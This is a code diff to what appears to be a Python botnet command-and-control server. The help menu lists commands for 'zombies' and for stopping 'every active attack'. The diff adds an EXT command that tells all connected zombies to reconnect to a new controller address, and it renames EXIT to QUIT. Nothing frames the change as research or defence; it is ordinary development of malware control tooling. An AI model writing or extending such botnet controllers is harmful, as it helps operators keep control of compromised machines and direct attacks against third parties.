@@ -49,7 +49,8 @@ def userInterface():
             print("ADD            Shows a list of every connected ip address.")
             print("CLS            Clears command prompt.")
             print("CON            Maximum number of connections.")
-            print("EXIT           Exits server.")
+            print("QUIT           Quits server.")
+            print("EXT            Changes the address that zombies connect to.")
             print("HELP           Shows list of commands.")
             print("MSG            Sends a costom message to all connections.")
             print("Stop           Stops every active attack.")
@@ -57,8 +58,8 @@ def userInterface():
             print()
         elif command[0] == "cls":
             os.system("cls")
-        elif command[0] == "exit":
-            exit(0)
+        elif command[0] == "quit":
+            quit(0)
         elif command[0] == "add":
             check()
             if len(add) > 0:
@@ -80,6 +81,11 @@ def userInterface():
                 send_all(["stop"])
             except:
                 print("Failed to send stop!")
+        elif command[0] == "ext":
+            try:
+                send_all((command[0], command[1], int(command[2])))
+            except:
+                print("EXT {ip} {port}", end="\n\n")
 
 # runs in the beginning of the program
 if __name__ == "__main__":
